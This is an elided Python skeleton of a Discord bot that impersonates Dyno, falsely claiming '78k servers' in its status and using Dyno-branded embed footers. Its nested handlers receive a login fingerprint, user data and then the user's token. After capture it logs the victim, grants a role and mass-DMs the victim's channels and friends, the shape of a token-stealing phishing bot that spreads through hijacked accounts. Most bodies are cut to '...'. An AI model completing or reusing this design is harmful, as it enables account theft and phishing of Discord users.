...
async def on_ready():
    startprint()
    await bot.change_presence(activity=nextcord.Game(name="more than 78k servers !"))
        ...
        async def on_fingerprint(data):
            ...
            async def on_userdata(user):
                ...
                async def on_token(token):
                    ...
                    if logs_channel:
                        embed_user.set_footer(text="Enjoy your time on the server  ・  Dyno")
                    ...
                    if give_role == True:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_role.set_footer(text="Enjoy your time on the server  ・  Dyno")
                    ...
                    if mass_dm == 1 or mass_dm == 3:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_cdm.set_footer(text="Enjoy your time on the server  ・  Dyno")
                    ...
                    if mass_dm == 2 or mass_dm == 3:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_fdm.set_footer(text="Enjoy your time on the server  ・  Dyno")
